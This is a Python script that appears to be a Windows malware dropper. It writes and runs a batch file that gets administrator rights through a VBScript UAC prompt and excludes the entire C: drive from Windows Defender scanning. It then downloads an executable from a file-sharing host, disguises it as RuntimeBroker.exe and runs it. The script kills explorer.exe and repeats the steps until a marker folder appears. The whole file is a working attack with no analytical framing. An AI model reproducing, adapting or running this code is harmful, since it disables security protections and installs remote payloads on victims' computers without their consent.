
def create_and_run_bat_script():
    bat_script_content = '''
@echo off
set "filePath=%appdata%\Microsoft\emptyfile20947.txt"
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

mkdir "C:\Windows\WinEmptyfold"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:'"

set "temp_file=%TEMP%\RuntimeBroker.exe"

powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://filebin.sourcepaint.cz/lqb1ilwxwuswzbhv/minor.exe', '%temp_file%')"

start "" "%temp_file%"

del /q "%appdata%\Microsoft
unpython.py"
'''

    temp_folder = os.environ.get('TEMP', '')
    if temp_folder:
        bat_script_path = os.path.join(temp_folder, 'temp_script.bat')
        with open(bat_script_path, 'w') as bat_file:
            bat_file.write(bat_script_content)
        os.system(bat_script_path)
    else:
        print("Failed to get the TEMP folder path.")

if os.name == 'nt':
    folder_path = r"C:\Windows\WinEmptyfold"
    if os.path.exists(folder_path):
        exit()
    else:
        os.system('taskkill /f /im explorer.exe')
        create_and_run_bat_script()
        while True:
            os.system('timeout 5')
            if os.path.exists(folder_path):
                os.system('start explorer.exe')
                break
            else:
                create_and_run_bat_script()
